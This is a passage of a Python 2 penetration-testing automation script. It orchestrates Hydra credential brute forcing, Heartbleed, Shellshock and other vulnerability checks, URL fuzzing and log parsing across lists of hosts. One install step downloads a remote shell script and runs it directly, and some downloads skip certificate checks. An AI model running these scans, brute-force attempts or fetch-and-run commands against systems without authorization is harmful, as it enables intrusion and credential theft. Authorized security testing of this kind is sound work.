#! /usr/bin/env python
#Prequisites
#gem install ruby-nmap
#gem install net-http-persistent
#gem install colorize
#gem install text-table
#gem install mechanize

#wget http://www.python.org/ftp/python/2.7.6/Python-2.7.6.tgz
#tar -xzf Python-2.7.6.tgz  
#cd Python-2.7.6
#./configure && make && make install

#wget https://bootstrap.pypa.io/get-pip.py
#python2.7 get-pip.py
#pip2.7 install -r /tmp1/tools/clusterd/requirements.txt 

try:
	import argparse
except:
	print "wget https://pypi.python.org/packages/source/s/setuptools/setuptools-7.0.tar.gz --no-check-certificate && tar xvfz setuptools-7.0.tar.gz && cd setuptools-7.0 && python setup.py install"
	print "wget https://pypi.python.org/packages/source/a/argparse/argparse-1.2.1.tar.gz --no-check-certificate && tar xvfz argparse-1.2.1.tar.gz && cd argparse-1.2.1 && python setup.py install"        
	sys.exit()
import urllib2
import socket
import datetime
import time
import multiprocessing
import commands
import sys
import os
import glob
import re
import httplib
import urllib
import urlparse

origPath = os.getcwd()
toolsPath = "/tmp1/tools/"
burpPath = "/pentest/burp/carbonator/"
sslCCSPath = toolsPath
yasuoPath = toolsPath+"/yasuo-master/"
clusterdPath = toolsPath+"/clusterd/"
whatwebPath = toolsPath+"/WhatWeb/"
wpscanPath  = toolsPath+"/wpscan/"
peepingTomPath = toolsPath+"/peepingtom/"
shellShockPath = toolsPath+"/shocker-master/"
tlssledPath = toolsPath+"/"
fuzzdbPath = toolsPath+"/fuzzdb-read-only/"
patatorPath = toolsPath+"/patator/"
tildePath = toolsPath+"/IIS-ShortName-Scanner/"
vpnPath = "/pentest/vpn/ikeforce/"

taskToRun=""
domainName=""
numProcesses=10

def checkForASA(host):
	url = "https://"+host+"/+CSCOE+/logon.html"
	urlparse.urlparse(host)
	try:
		c = httplib.HTTPSConnection(host,timeout=10)
		c.request("HEAD", "/+CSCOE+/logon.html")
		response = c.getresponse()
		if response.status==200:
			return True
	except:
		return False


def downloadFiles():
	import urllib
	if not os.path.exists(toolsPath):
		#Create folder
		cmd = "mkdir "+toolsPath
	        commands.getoutput(cmd)
	
		#Download shell script and download prerequisites	
		cmd = "wget https://raw.githubusercontent.com/milo2012/pentest_automation/master/prequisites.sh && chmod 755 prerequisites.sh && sh prequisites.sh"
	        commands.getoutput(cmd)

	if not os.path.exists(toolsPath+"/JBoss.fuzz.txt"):
		cmd = "cd "+toolsPath+" && wget https://fuzzdb.googlecode.com/svn-history/r158/trunk/discovery/PredictableRes/JBoss.fuzz.txt"
		commands.getoutput(cmd)
	if not os.path.exists(toolsPath+"/ApacheTomcat.fuzz.txt"):
		cmd = "cd "+toolsPath+" && wget https://fuzzdb.googlecode.com/svn-history/r158/trunk/discovery/PredictableRes/ApacheTomcat.fuzz.txt"
		commands.getoutput(cmd)
		
	if not os.path.exists(toolsPath+"/peepingtom"):
		cmd = "cd "+toolsPath+" && git clone https://bitbucket.org/LaNMaSteR53/peepingtom.git"
		commands.getoutput(cmd)

		cmd = "cd "+toolsPath+" && wget https://bitbucket.org/ariya/phantomjs/downloads/phantomjs-1.9.8-linux-i686.tar.bz2"
		commands.getoutput(cmd)
		cmd = "cd "+toolsPath+" && bunzip2 -d phantomjs-1.9.8-linux-i686.tar.bz2"
		commands.getoutput(cmd)
		cmd = "cd "+toolsPath+" && tar xvf phantomjs-1.9.8-linux-i686.tar"
		commands.getoutput(cmd)
		cmd = "cd "+toolsPath+" && cp phantomjs-1.9.8-linux-i686/bin/phantomjs "+toolsPath+"/peepingtom"
		commands.getoutput(cmd)

	if not os.path.exists(toolsPath+"/clusterd"):
		cmd = "cd "+toolsPath+" && git clone https://github.com/hatRiot/clusterd.git"
		commands.getoutput(cmd)
		
	if not os.path.exists(toolsPath+"/wordList_ssh_hydra.txt"):
		testfile = urllib.URLopener()
		testfile.retrieve("https://raw.githubusercontent.com/milo2012/pentest_scripts/master/default_accounts_wordlist/wordList_ssh_hydra.txt",toolsPath+"wordList_ssh_hydra.txt")

	#if not os.path.exists(toolsPath+"/wordList_ssh.txt"):
	#	testfile = urllib.URLopener()
	#	testfile.retrieve("https://raw.githubusercontent.com/milo2012/pentest_scripts/master/default_accounts_wordlist/wordList_ssh.txt", toolsPath+"wordList_ssh.txt")
	#if not os.path.exists(toolsPath+"/wordList_telnet.txt"):
	#	testfile = urllib.URLopener()
	#	testfile.retrieve("https://raw.githubusercontent.com/milo2012/pentest_scripts/master/default_accounts_wordlist/wordList_telnet.txt", toolsPath+"wordList_telnet.txt")

def timeout_command(command, timeout):
        import subprocess, datetime, os, time, signal
        start = datetime.datetime.now()
        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        while process.poll() is None:
                time.sleep(0.1)
                now = datetime.datetime.now()
                if (now - start).seconds> timeout:
                        os.kill(process.pid, signal.SIGKILL)
                        os.waitpid(-1, os.WNOHANG)
                        return None
        return process.stdout.read()
		
def RunCommand(fullCmd):
    fullCmd += "& sleep 300; kill $!"
    try:
        return commands.getoutput(fullCmd)
    except:
        return "Error executing command %s" %(fullCmd)
class Worker1(multiprocessing.Process):
 
    def __init__(self,
            work_queue,
            result_queue,
          ):
        multiprocessing.Process.__init__(self)
        self.work_queue = work_queue
        self.result_queue = result_queue
        self.kill_received = False
    def run(self):
        while (not (self.kill_received)) and (self.work_queue.empty()==False):
            try:
                job = self.work_queue.get_nowait()
            except:
                break
            (jobid,jobTitle,hostNo,runCmd) = job       
	    runCmd.split(" ")
            #rtnVal = (jobid,jobTitle,hostNo,timeout_command(runCmdList,120))
            rtnVal = (jobid,jobTitle,hostNo,RunCommand(runCmd))
            self.result_queue.put(rtnVal)

def parseLogs():
	#Parsing Tlssled Log Files
	filename = "runSSLTlssled_*.log"

	failedList=[]
	weakCipherList=[]
	renegotiationSecureList=[]
	renegotiationInsecureList=[]
	renegotiationTempList=[]
	sslv3List=[]
	sslv2List=[]
	for file in glob.glob(filename):
		lines=[]
		with open(file) as f:
    			lines = f.read().splitlines()
		tempTitle=""
		renegType=""
   	 	for line in lines:
			line = line.strip()
			if "[*] Running sslscan on " in line:
				tempTitle = line
				tempTitle = tempTitle.replace("[*] Running sslscan on ","")
				tempTitle = tempTitle.replace(" ...","")
			if "[!] ERROR: The target service " in line:
				line = line.replace("[!] ERROR: The target service ","")
				line = line.replace("does not seem","")
				line = line.replace("to speak SSL/TLS or it is not reachable!!","")
				line = line.strip()
				if line not in failedList:
					failedList.append(line)
			if ("  40 bits   " in line or "  56 bits   " in line) and "Accepted " in line:
				if tempTitle not in weakCipherList:
					weakCipherList.append(tempTitle)
			if "Secure Renegotiation IS supported" in line:
				if tempTitle not in renegotiationTempList:
					renegotiationTempList.append(tempTitle)		
			if "Testing for client initiated (CI) SSL/TLS renegotiation (secure)..." in line:
				renegType = "secure"
			if "Testing for client initiated (CI) SSL/TLS renegotiation (insecure)..." in line:
				renegType = "insecure"		
			if "(CI) SSL/TLS renegotiation IS enabled" in line:
				if tempTitle not in renegotiationSecureList and renegType=="secure" and tempTitle in renegotiationTempList:
					renegotiationSecureList.append(tempTitle)
				if tempTitle not in renegotiationInsecureList and renegType=="insecure"  and tempTitle in renegotiationTempList:
					renegotiationInsecureList.append(tempTitle)
			if " SSLv3" in line and "Accepted" in line:
				if tempTitle not in sslv3List:
					sslv3List.append(tempTitle)
			if " SSLv2" in line and "Accepted" in line:
				if tempTitle not in sslv2List:
					sslv2List.append(tempTitle)
	if len(failedList)>0:
		print "\n****** TLSSLed Scan Failure  ****** "
		for x in failedList:
			print x
			y = x.split(":")
			filename = origPath+"/runSSLTlssled_"+y[0]+"_"+y[1]+".log"
			os.remove(filename)
		print "Please rerun 'python2.7 runMulti.py -tasks tlssled' to retest failed hosts"
	if len(weakCipherList)>0:
		print "\n****** Weak TLS/SSL Ciphers ****** "
		for x in weakCipherList:
			print x
	secureAndInsecureList=[]
	secureList=[]
	insecureList=[]

	for x in renegotiationSecureList:
		if x in renegotiationInsecureList:
			if x not in secureAndInsecureList:
				secureAndInsecureList.append(x)
		else:
			if x not in secureList:
				secureList.append(x)
	for x in renegotiationInsecureList:
		if x in renegotiationSecureList:
			if x not in secureAndInsecureList:
				secureAndInsecureList.append(x)
		else:
			if x not in insecureList:
				insecureList.append(x)

	if len(secureAndInsecureList)>0:
		print "\n****** Secure and Insecure SSL Renegotatiation ****** "
		for x in secureAndInsecureList:
			print x
	if len(secureList)>0:
		print "\n****** Secure SSL Renegotatiation ****** "
		for x in secureList:
			print x
	if len(insecureList)>0:
		print "\n****** Insecure SSL Renegotatiation ****** "
		for x in insecureList:
			print x

	if len(sslv3List)>0:
		print "\n****** SSLv3 Supported ****** "
		for x in sslv3List:
			print x
	if len(sslv2List)>0:
		print "\n****** SSLv2 Supported ****** "
		for x in sslv2List:
			print x

	filename = "runSSLTlssled*.log"
	failedList=[]
	vulnList=[]	
	for file in glob.glob(filename):
		lines=[]
		with open(file) as f:
    			lines = f.read().splitlines()
		if "[*] Running sslscan on " not in str(lines):
			failedList.append(file)
			os.remove(origPath+"/"+file)
	
	if len(failedList)>0:		
		print "\n****** Tlssled Failure  ****** "
		for x in failedList:
			print x
			y = x.split(":")
		print "Please rerun 'python2.7 runMulti.py -tasks tlssled' to retest failed hosts"

	currentYear = (time.strftime("%Y"))
	currentMth = (time.strftime("%m"))
	currentDay = (time.strftime("%d"))

	currentDate = datetime.datetime(int(currentYear),int(currentMth),int(currentDay))

        filename = "runXmpp_*.log"
        failedList=[]
        vulnList=[]
        for file in glob.glob(filename):
		tempTitle = file.replace("runXmpp_","")
		tempTitle = tempTitle.replace(".log","")
		tempTitle = tempTitle.replace("_",":")
		hostNo = tempTitle.split(":")[0]
		portNo = tempTitle.split(":")[1]
                lines=[]
                with open(file) as f:
                        lines = f.read().splitlines()
		for x in lines:
			if "Valid credentials" in x:
				if x not in vulnList:
					vulnList.append(hostNo+":"+portNo,x)

	if len(vulnList)>0:
		print "\n****** Found the below credentials on XMPP server****** "
		for x in vulnList:
			print x

        filename = "runYasuo_*.log"
        failedList=[]
        vulnList=[]
        for file in glob.glob(filename):
                lines=[]
                with open(file) as f:
                        lines = f.read().splitlines()
		for x in lines:
			if "| http" in x:
				if x not in vulnList:
					vulnList.append(x)

	if len(vulnList)>0:
		print "\n****** Found the below applications ****** "
		for x in vulnList:
			print x


        filename = "runSSLCert_*.log"
        failedList=[]
        vulnList=[]
        for file in glob.glob(filename):
                lines=[]
                with open(file) as f:
                        lines = f.read().splitlines()
			tempTitle = file.replace("runSSLCert_","")
			tempTitle = tempTitle.replace(".log","")
			tempTitle = tempTitle.replace("_",":")
			hostNo = tempTitle.split(":")[0]
			portNo = tempTitle.split(":")[1]
		for x in lines:
			if "Not valid after" in x:
				x = x.replace("Not valid after:","")
				x = x.replace("|","")
				y = x.split("T")[0]
				y = y.strip()
				try:
					certDateYear = int(y.split("-")[0])
					certDateMth  = int(y.split("-")[1])
					certDateDay  = int(str(y.split("-")[2]).split(" ")[0])
					certDate = datetime.datetime(certDateYear,certDateMth,certDateDay)
					if currentDate>certDate:
						vulnList.append(tempTitle+"\t"+y)
				except ValueError:
					continue
	if len(vulnList)>0:
		print "\n****** Expired SSL Certificates ****** "
		for x in vulnList:
			print x

	vulnList=[]
	fileList=[]
	fileList.append("portFTP.txt")
	fileList.append("portTelnet.txt")
	for file in fileList:
		if os.path.exists(origPath+"/"+file):
			f = open(file,"r")
	        	lines = f.read().splitlines()
			for line in lines:
				vulnList.append(line)
        if len(vulnList)>0:
                print "\n****** Plaintext Protocols  ****** "
		for x in vulnList:
			print x

        if len(failedList)>0:
                print "\n****** Hydra SSH Bruteforce Failure  ****** "
                for x in failedList:
                        print x
                        y = x.split(":")
                print "Please rerun 'python2.7 runMulti.py -tasks ssh' to retest failed hosts"

        filename = "runHydraSSH_*.log"
        failedList=[]
        vulnList=[]
        for file in glob.glob(filename):
                lines=[]
                with open(file) as f:
                        lines = f.read().splitlines()
                if "finished at " not in str(lines):
                        failedList.append(file)
                        os.remove(origPath+"/"+file)

        if len(failedList)>0:
                print "\n****** Hydra SSH Bruteforce Failure  ****** "
                for x in failedList:
                        print x
                        y = x.split(":")
                print "Please rerun 'python2.7 runMulti.py -tasks ssh' to retest failed hosts"


        filename = "runHydraTelnet_*.log"
        failedList=[]
        vulnList=[]
        for file in glob.glob(filename):
                lines=[]
                with open(file) as f:
                        lines = f.read().splitlines()
                if "finished at " not in str(lines):
                        failedList.append(file)
                        os.remove(origPath+"/"+file)

        if len(failedList)>0:
                print "\n****** Hydra Telnet Bruteforce Failure  ****** "
                for x in failedList:
                        print x
                        y = x.split(":")
                print "Please rerun 'python2.7 runMulti.py -tasks telnet' to retest failed hosts"


        filename = "runHydraFTP_*.log"
        failedList=[]
        vulnList=[]
        for file in glob.glob(filename):
                lines=[]
                with open(file) as f:
                        lines = f.read().splitlines()
                if "0 of 1 target completed" in str(lines):
                        failedList.append(file)
                        os.remove(origPath+"/"+file)

        if len(failedList)>0:
                print "\n****** Hydra FTP Bruteforce Failure  ****** "
                for x in failedList:
                        print x
                        y = x.split(":")
                print "Please rerun 'python2.7 runMulti.py -tasks ftp' to retest failed hosts"


	filename = "runSSLHeartbleed_*.log"
	failedList=[]
	vulnList=[]	
	notVulnList=[]
	for file in glob.glob(filename):
		lines=[]
		tempTitle = file.replace("runSSLHeartbleed_","")
		tempTitle = tempTitle.replace(".log","")
		tempTitle = tempTitle.replace("_",":")
		with open(file) as f:
    			lines = f.read().splitlines()
		if "likely not vulnerable" in str(lines):
			if tempTitle not in notVulnList:
				notVulnList.append(tempTitle)
		else:
			if "vulnerable" in str(lines):
				if tempTitle not in notVulnList:
					if tempTitle not in vulnList:
						vulnList.append(tempTitle)
			else:
				if tempTitle not in failedList:
					failedList.append(tempTitle)
	if len(vulnList)>0:
		print "\n****** Vulnerable to Heartbleed ****** "
		for x in vulnList:
			print x
	if len(failedList)>0:
		print "\n****** Heartbleed Test issues ****** "
		for x in failedList:
			print x
			hostNo = x.split(":")
			#logFilename = "runSSLHeartbleed_"+hostNo[0]+"_"+hostNo[1]+".log"
			#os.remove(logFilename)		

	filename = "runSSLCCS_*.log"
	failedList=[]
	vulnList=[]	
	for file in glob.glob(filename):
		lines=[]
		tempTitle = file.replace("runSSLCCS_","")
		tempTitle = tempTitle.replace(".log","")
		tempTitle = tempTitle.replace("_",":")
		with open(file) as f:
    			lines = f.read().splitlines()
   	 	for line in lines:
			line = line.strip()
			if "may allow" in line:
				if tempTitle not in vulnList:
					vulnList.append(tempTitle)
			if "Failure connecting to" in line:
				if tempTitle not in failedList:
					failedList.append(tempTitle)
	if len(failedList)>0:
		print "\n****** OpenSSL ChangeCipherSpec Scan Failure  ****** "
		for x in failedList:
			print x
			y = x.split(":")
			filename = origPath+"/runSSLCCS_"+y[0]+"_"+y[1]+".log"
			os.remove(filename)
		print "Please rerun 'python2.7 runMulti.py -tasks sslccs' to retest failed hosts"
	if len(vulnList)>0:
		print "\n****** Vulnerable to OpenSSL ChangeCipherSpec Man-in-the-middle Flaw ******"
		for x in vulnList:
			print x

	filename = "runShellshock_*.log"
	failedList=[]
	vulnList=[]	
	for file in glob.glob(filename):
		lines=[]
		tempTitle = file.replace("runShellshock_","")
		tempTitle = tempTitle.replace(".log","")
		tempTitle = tempTitle.replace("_",":")
		with open(file) as f:
    			lines = f.read().splitlines()
   	 	for line in lines:
			line = line.strip()
			if "looks vulnerable" in line:
				print line
				if tempTitle not in vulnList:
					vulnList.append(tempTitle)
			if "Failure connecting to" in line:
				if tempTitle not in failedList:
					failedList.append(tempTitle)
	if len(failedList)>0:
		print "\n****** Shellshock Test Failure  ****** "
		for x in failedList:
			print x
			y = x.split(":")
			filename = origPath+"/runShellshock_"+y[0]+"_"+y[1]+".log"
			os.remove(filename)
		print "Please rerun 'python2.7 runMulti.py -tasks shellshock' to retest failed hosts"
	if len(vulnList)>0:
		print "\n****** Vulnerable to Shellshock ******"
		for x in vulnList:
			print x

	#SSL Known Key
	filename = "runSSLKnownKey_*.log"
	failedList=[]
	vulnList=[]	
	for file in glob.glob(filename):
		lines=[]
		tempTitle = file.replace("runSSLKnownKey_","")
		tempTitle = tempTitle.replace(".log","")
		tempTitle = tempTitle.replace("_",":")
		with open(file) as f:
    			lines = f.read().splitlines()
   	 	for line in lines:
			line = line.strip()
			if "Found in " in line:
				if tempTitle not in vulnList:
					vulnList.append(tempTitle)
	if len(vulnList)>0:
		print "\n****** SSL-Known-Key in LittleBlackBox ******"
		for x in vulnList:
			print x

	#Clusterd
	filename = "runClusterd_*.log"
	failedList=[]
	vulnList=[]	
	for file in glob.glob(filename):
		lines=[]
		tempTitle = file.replace("runClusterd_","")
		tempTitle = tempTitle.replace(".log","")
		tempTitle = tempTitle.replace("_",":")
		tempTitle = tempTitle.replace("https:","https://")
		tempTitle = tempTitle.replace("http:","http://")
		with open(file) as f:
    			lines = f.read().splitlines()
   	 	for line in lines:
			line = line.strip()
			ansi_escape = re.compile(r'\x1b[^m]*m')
			line = ansi_escape.sub('', line)
			if "] 	" in line:
				line1 = line.split("\t")
				if tempTitle not in vulnList:
					vulnList.append(tempTitle+"\t"+line1[1])
	if len(vulnList)>0:
		print "\n****** Clusterd Results ******"
		for x in vulnList:
			print x


	#NTP Monlist
	filename = "runNTP.log"
	failedList=[]
	vulnList=[]	
	lines=[]

	if os.path.exists(filename):
		with open(filename) as f:
   			lines = f.read().splitlines()
			tempTitle=""
  	 		for line in lines:
				line = line.strip()
				if "Nmap scan report for " in line:
					tempTitle = line.replace("Nmap scan report for ","")
				if "ntp-monlist:" in line:
					if tempTitle not in vulnList:
						vulnList.append(tempTitle)
	if len(vulnList)>0:
		print "\n****** NTP Monlist ******"
		for x in vulnList:
			print x

	#Tilde
	filename = "runTilde_*.log"
	failedList=[]
	vulnList=[]	
	for file in glob.glob(filename):
		lines=[]
		tempTitle = file.replace("runTilde_","")
		tempTitle = tempTitle.replace(".log","")
		tempTitle = tempTitle.replace("_",":")
		with open(file) as f:
    			lines = f.read().splitlines()
		found1=False
		tempList=[]
		tempTitle1=""
   	 	for line in lines:
			line = line.strip()
			if "--------- Final Result ---------" in line.strip():
				found1=True
				if tempTitle not in tempList:
					tempTitle1 = "\nThe below files and folders are enumerated on host: "+tempTitle
					#tempList.append("\n********** "+tempTitle+" **********")
			if "File(s) was/were found" in line.strip():
				if "0 Dir(s) was/were found" in tempList and "0 File(s) was/were found" in tempList:
					continue
				else:
					if len(tempList)>1:
						vulnList.append(tempTitle1)
						for x in tempList:
							vulnList.append(x)
				tempList=[]
				found1=False
			if found1==True:
				if "Dir(s) was/were found" not in line and "--------- Final Result ---------" not in line and "requests have been sent to the server" not in line:
					tempList.append(line)

	if len(vulnList)>0:
		print "\n****** Hosts Vulnerable to Tilde Enumeration ******"
		for x in vulnList:
			print x
	#VPN
	filename = "runPort500_ikescan_*.log"
	failedList=[]
	vulnList=[]	
	for file in glob.glob(filename):
		lines=[]
		tempTitle = file.replace("runPort500_ikescan_","")
		tempTitle = tempTitle.replace(".log","")
		tempTitle = tempTitle.replace("_",":")
		with open(file) as f:
    			lines = f.read().splitlines()
   	 	for line in lines:
			line = line.strip()
			if "DES" in line:
				if tempTitle not in vulnList:
					vulnList.append(tempTitle)
	if len(vulnList)>0:
		print "\n****** VPN Peer Supports Weak Encryption ******"
		for x in vulnList:
			print x

	vulnList=[]
	filename = "runShellshock_https_*.log"
	for file in glob.glob(filename):
		lines=[]
		tempTitle = file.replace("runShellshock_https_","")
		tempTitle = tempTitle.replace(".log","")
		tempTitle = tempTitle.replace("_",":")
		with open(file) as f:
    			lines = f.read().splitlines()
   	 	for line in lines:
			line = line.strip()
			if "looks vulnerable " in line:
				line = line.replace("Service Info: ","")
				if tempTitle not in vulnList:
					vulnList.append(tempTitle+"\t"+line)
	if len(vulnList)>0:
		print "\n****** Shellshock ******"
		for x in vulnList:
			print x

	#VPN Device Fingerprinting
	filename = "runPort500_ikeversion_*.log"
	failedList=[]
	vulnList=[]	
	for file in glob.glob(filename):
		lines=[]
		tempTitle = file.replace("runPort500_ikeversion_","")
		tempTitle = tempTitle.replace(".log","")
		tempTitle = tempTitle.replace("_",":")
		with open(file) as f:
    			lines = f.read().splitlines()
   	 	for line in lines:
			line = line.strip()
			if "Service Info: " in line:
				line = line.replace("Service Info: ","")
				if tempTitle not in vulnList:
					vulnList.append(tempTitle+"\t"+line)
	if len(vulnList)>0:
		print "\n****** VPN Device Fingerprinting ******"
		for x in vulnList:
			print x

	#SNMP Bruteforce
	filename = "runSNMP_*.log"
	failedList=[]
	vulnList=[]	
	for file in glob.glob(filename):
		lines=[]
		tempTitle = file.replace("runSNMP_","")
		tempTitle = tempTitle.replace(".log","")
		tempTitle = tempTitle.replace("_",":")
		with open(file) as f:
    			lines = f.read().splitlines()
   	 	for line in lines:
			line = line.strip()
			if "valid credentials" in line.lower():
				line = line.replace("- Valid credentials","")
				line = line.replace("|_","")
				line = line.strip()
				if tempTitle not in vulnList:
					vulnList.append(tempTitle+"\t"+line)
	if len(vulnList)>0:
		print "\n****** SNMP Bruteforce ******"
		for x in vulnList:
			print x

	#Hydra SSH
	filename = "runHydraSSH_*.log"
	failedList=[]
	vulnList=[]	
	for file in glob.glob(filename):
		lines=[]
		tempTitle = file.replace("runHydraSSH_","")
		tempTitle = tempTitle.replace(".log","")
		tempTitle = tempTitle.replace("_",":")
		with open(file) as f:
    			lines = f.read().splitlines()
   	 	for line in lines:
			line = line.strip()
			if "[ssh] host: " in line:
				if tempTitle not in vulnList:
					vulnList.append(line)
	if len(vulnList)>0:
		print "\n****** Hydra SSH Results ******"
		for x in vulnList:
			print x

	#DNS Zone Transfer
	filename = "runPort53_zonetransfer_*.log"
	failedList=[]
	vulnList=[]	
	for file in glob.glob(filename):
		lines=[]
		tempTitle = file.replace("runPort53_zonetransfer_","")
		tempTitle = tempTitle.replace(".log","")
		tempTitle = tempTitle.replace("_",":")
		with open(file) as f:
    			lines = f.read().splitlines()
   	 	for line in lines:
			line = line.strip()
			if "dns-zone-transfer:" in line:
				if tempTitle not in vulnList:
					vulnList.append(tempTitle)
	if len(vulnList)>0:
		print "\n****** DNS Zone Transfer ******"
		for x in vulnList:
			print x
        
def execute1(jobs, num_processes=2):
    work_queue = multiprocessing.Queue()
    for job in jobs:
        work_queue.put(job)
 
    result_queue = multiprocessing.Queue()
    worker = []
    for i in range(int(num_processes)):
        worker.append(Worker1(work_queue, result_queue))
        worker[i].start()
    
    results = []
    while len(results) < len(jobs): 
        result = result_queue.get()
        results.append(result)
    results.sort() 
    return (results) 
os.chdir(origPath)

sslList=[]
resultListwhatweb=[]
resultListASAXSS=[]
resultListshellshock=[]
resultListclusterd=[]
resultListsslcert=[]
resultListsslknownkey=[]
resultListsslccs=[]
resultListheartbleed=[]
resultListtlssled=[]
resultListtelnet=[]
resultListssh=[]
resultListssl=[]
resultList161=[]
resultList3306=[]
resultList6379=[]
resultList1099=[]
resultList5432=[]
resultList2010=[]
resultList27017=[]
resultList512=[]
resultList5900=[]
resultList5222=[]
resultList500=[]
resultList5900=[]
resultList25=[]
resultList139=[]
resultList512=[]
resultList513=[]
resultList554=[]
resultList902=[]
resultList2002=[]
resultList2401=[]
resultList8098=[]
resultList9160=[]
resultList873=[]
resultList1080=[]
resultList1723=[]
resultList3389=[]
resultList5432=[]
resultList5666=[]
resultList5850=[]
resultList9390=[]
resultList9391=[]
resultList9929=[]
resultList49152=[]
resultList445=[]
resultList137=[]
resultList53=[]

def chunk(input, size):
        return map(None, *([iter(input)] * size))

def testURLs(url):
	filename = origPath+"/uriList.txt"
	if not os.path.exists(filename):
		urllib.urlretrieve ("https://raw.githubusercontent.com/milo2012/metasploitHelper/master/uriList.txt","uriList.txt")
	wordList=[]
	wordList.append("/jmx-console")
	wordList.append("/web-console")
	wordList.append("/web-console/Invoker")
	wordList.append("/invoker/JMXInvokerServlet")
	wordList.append("/WEB-INF/jboss-web.xml")
	wordList.append("/examples")
	wordList.append("/examples/jsp/index.html")
	wordList.append("/examples/jsp/snp/snoop.jsp")
	wordList.append("/examples/jsp/source.jsp")
	wordList.append("/examples/servlet/HelloWorldExample")
	wordList.append("/examples/servlet/SnoopServlet")
	wordList.append("/examples/servlet/TroubleShooter")
	wordList.append("/examples/servlet/default/jsp/snp/snoop.jsp")
	wordList.append("/examples/servlet/default/jsp/source.jsp")
	wordList.append("/examples/servlet/org.apache.catalina.INVOKER.HelloWorldExample")
	wordList.append("/examples/servlet/org.apache.catalina.INVOKER.SnoopServlet")
	wordList.append("/examples/servlet/org.apache.catalina.INVOKER.TroubleShooter")
	wordList.append("/examples/servlet/org.apache.catalina.servlets.DefaultServlet/jsp/snp/snoop.jsp")
	wordList.append("/examples/servlet/org.apache.catalina.servlets.DefaultServlet/jsp/source.jsp")
	wordList.append("/examples/servlet/org.apache.catalina.servlets.WebdavServlet/jsp/snp/snoop.jsp")
	wordList.append("/examples/servlet/org.apache.catalina.servlets.WebdavServlet/jsp/source.jsp")
	wordList.append("/examples/servlet/snoop")
	wordList.append("/examples/servlets/index.html")
	wordList.append("/jsp-examples")
	wordList.append("/manager")
	wordList.append("/manager/deploy?path=foo")
	wordList.append("/manager/html/")
	wordList.append("/servlet/default/")
	wordList.append("/servlet/org.apache.catalina.INVOKER.org.apache.catalina.servlets.DefaultServlet/tomcat.gif")
	wordList.append("/servlet/org.apache.catalina.INVOKER.org.apache.catalina.servlets.SnoopAllServlet")
	wordList.append("/servlet/org.apache.catalina.INVOKER.org.apache.catalina.servlets.WebdavServlet/")
	wordList.append("/servlet/org.apache.catalina.servlets.DefaultServlet/")
	wordList.append("/servlet/org.apache.catalina.servlets.DefaultServlet/tomcat.gif")
	wordList.append("/servlet/org.apache.catalina.servlets.HTMLManagerServlet")
	wordList.append("/servlet/org.apache.catalina.servlets.InvokerServlet/org.apache.catalina.servlets.DefaultServlet/tomcat.gif")
	wordList.append("/servlet/org.apache.catalina.servlets.InvokerServlet/org.apache.catalina.servlets.SnoopAllServlet")
	wordList.append("/servlet/org.apache.catalina.servlets.ManagerServlet")
	wordList.append("/servlet/org.apache.catalina.servlets.SnoopAllServlet")
	wordList.append("/servlet/org.apache.catalina.servlets.WebdavServlet/")
	wordList.append("/tomcat-docs")
	wordList.append("/webdav")
	wordList.append("/webdav/index.html")
	wordList.append("/webdav/servlet/org.apache.catalina.servlets.WebdavServlet/")
	wordList.append("/webdav/servlet/webdav/")
	wordList.append("/conf/")
	wordList.append("/conf/server.xml/")	
	wordList.append("/WEB-INF/")
	wordList.append("/WEB-INF/web.xml")	
	wordList.append("/WEB-INF/classes/")
	wordList.append("/shared/")
	wordList.append("/shared/lib/")

	f = open(filename,"r")
	lines = f.read().splitlines()
	for line in lines:
		wordList.append(line)
	f.close()

	filename = open(origPath+"/tempFuzz.txt","w")
	for uriPath in wordList:
		filename.write(uriPath+"\n")
	filename.close()

	if "https" in url:
		url1 = url.replace("https://","")
		hostList = url1.split(":")
		hostNo = hostList[0].strip()
		portNo = hostList[1].strip()
		logFilename = origPath+"/runPatator_https_"+hostNo+"_"+portNo
	else:
		url1 = url.replace("http://","")
		hostList = url1.split(":")
		hostNo = hostList[0].strip()
		portNo = hostList[1].strip()
		logFilename = origPath+"/runPatator_https_"+hostNo+"_"+portNo

	
	fullCmd = "cd "+patatorPath+" && python patator.py http_fuzz --threads="+str(numProcesses)+" method=HEAD url="+url+"FILE0 0="+origPath+"/tempFuzz.txt -l "+logFilename
	print fullCmd
	RunCommand(fullCmd)

	
	#newUrl = url+uriPath
	#(scheme, netloc, path, params, query, fragment) = urlparse.urlparse(newUrl)
	#if "https" in url:
	#	conn = httplib.HTTPSConnection(netloc,timeout=10)
        #else:
	#	conn = httplib.HTTPConnection(netloc,timeout=10)
	#conn.request("HEAD", urlparse.urlunparse(('', '', path, params, query, fragment)))
	#res = conn.getresponse()
	#if res.status!=404:
	#print newUrl+"\t"+str(res.status)
	#print res.status, res.reason			


def runModules(quiet):
	cmdList = []
	jobs = [] 
	jobid = 0

	if (taskToRun=="5222" or taskToRun=="bruteURL" or taskToRun=="xmpp" or taskToRun=="yasuo" or taskToRun=="http" or taskToRun=="all" or taskToRun=="whatweb" or taskToRun=="clusterd" or taskToRun=="shellshock" or taskToRun=="asa" or taskToRun=="jboss" or taskToRun=="tomcat" or taskToRun=="dns"):
		filename = origPath+"/portHTTP.txt"
		httpList=[]
		if os.path.exists(filename):
			with open(filename) as f:
    				for line in f:
					httpList.append(line)
			for host in httpList:
				host = host.strip()
				host1 = host.replace("https://","")
				host1 = host1.replace("http://","")

				hostList = host1.split(":")
				hostNo = hostList[0].strip()
				portNo = hostList[1].strip()

				if taskToRun=="bruteURL" or taskToRun=="all":
					testURLs(host)

				#if taskToRun=="jboss" or taskToRun=="all":
				#	logFilename = origPath+"/runJboss_http_"+hostNo+"_"+portNo
				#	if not os.path.exists(logFilename):
				#		fullCmd = "cd "+patatorPath+" && python patator.py http_fuzz url=http://"+hostNo+":"+portNo+"FILE0 0="+toolsPath+"/JBoss.fuzz.txt -l "+logFilename
				#		if quiet==False:
    				#			print fullCmd
				#		cmdList.append(["jboss",hostNo,fullCmd])

				#if taskToRun=="tomcat" or taskToRun=="all":
				#	logFilename = origPath+"/runTomcat_http_"+hostNo+"_"+portNo
				#	if not os.path.exists(logFilename):
				#		fullCmd = "cd "+patatorPath+" && python patator.py http_fuzz url=http://"+hostNo+":"+portNo+"FILE0 0="+toolsPath+"/ApacheTomcat.fuzz.txt -l "+logFilename
				#		if quiet==False:
    				#			print fullCmd
				#		cmdList.append(["tomcat",hostNo,fullCmd])

				if taskToRun=="whatweb" or taskToRun=="all" or taskToRun=="http":
					logFilename=origPath+"/runWhatWeb.log"
					if not os.path.exists(logFilename):
